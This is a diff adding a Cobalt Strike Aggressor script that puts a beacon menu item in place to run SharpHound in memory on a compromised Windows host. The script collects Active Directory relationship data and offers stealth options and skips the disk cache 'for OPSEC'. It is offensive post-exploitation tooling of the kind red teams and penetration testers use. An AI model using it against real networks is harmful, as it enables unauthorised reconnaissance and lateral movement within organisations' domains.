@@ -1,0 +1,54 @@
+# SharpHound Aggressor Script
+# Version: 1.0
+# Author: @captmeelo
+# Blog: https://captmeelo.com/
+# GitHub: https://github.com/capt-meelo
+
+# Location of SharpHound binary
+$assembly = "C:\\tools\\SharpCollection\\NetFramework_4.5_x64\\SharpHound.exe";
+
+popup beacon_bottom {
+	item "SharpHound" {
+		runSharpHound($1);
+	}
+}
+
+sub runSharpHound {	
+	$bid = $1;
+	
+	$dialog = dialog("SharpHound", %(collectionmethod => "Default", outputdir => "C:\\Windows\\Temp\\"), lambda({
+			$collectionmethod = $3["collectionmethod"];
+			
+			if ($3["domain"] ne $null) {
+				$domain = $3["domain"];
+				$domain = "--Domain $domain";
+			} else {
+				$domain = "";
+			}
+			
+			if ($3["stealth"] eq "true") {
+				$stealth = "--Stealth";
+			} else {
+				$stealth = "";
+			}
+			
+			if ($3["outputdir"] ne $null) {
+				$outputdir = $3["outputdir"];
+				$outputdir = "--OutputDirectory $outputdir"
+			} else {
+				$outputdir = "";
+			}
+			
+			bexecute_assembly($bid, $assembly, "--CollectionMethod $collectionmethod $domain --NoSaveCache $stealth $outputdir");
+		})
+	);
+	
+	dialog_description($dialog, "Execute SharpHound without saving cache file to disk for OPSEC.");
+	drow_combobox($dialog, "collectionmethod", "Collection Method:", @("All,GPOLocalGroup", "All", "Default", "Group", "LocalAdmin", "RDP", "DCOM", "PSRemote", "GPOLocalGroup", "Session", "ComputerOnly", "LoggedOn", "Trusts", "ACL", "Container", "DcOnly", "ObjectProps"));
+	drow_text($dialog, "domain", "Domain: ");
+	drow_text($dialog, "outputdir", "Output Directory: ");
+	drow_checkbox($dialog, "stealth", "Stealth Mode: ", "Enable");
+	dbutton_action($dialog, "Run");
+	dbutton_help($dialog, "https://bloodhound.readthedocs.io/en/latest/data-collection/sharphound.html");
+	dialog_show($dialog);
+}
